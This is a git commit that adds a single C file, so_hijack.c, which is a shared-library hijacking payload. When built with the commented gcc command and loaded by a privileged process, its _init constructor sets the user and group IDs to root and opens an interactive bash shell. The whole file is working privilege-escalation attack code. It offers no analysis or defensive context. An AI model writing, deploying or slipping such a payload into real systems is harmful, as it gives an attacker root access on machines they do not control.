9fc3ead49e8799e83a12654445ccc821efe29193
Rob Flemen <rflemen@gmail.com>
2025-10-26 21:40:53 -0400

    initial commit

---
+++ so_hijack.c
@@ -0,0 +1,10 @@
+#include <stdlib.h>
+#include <unistd.h>
+
+// Compile via: gcc -shared -fPIC -nostartfiles -o <insertlib name>lib.so so_hijack.c
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -i");
+}
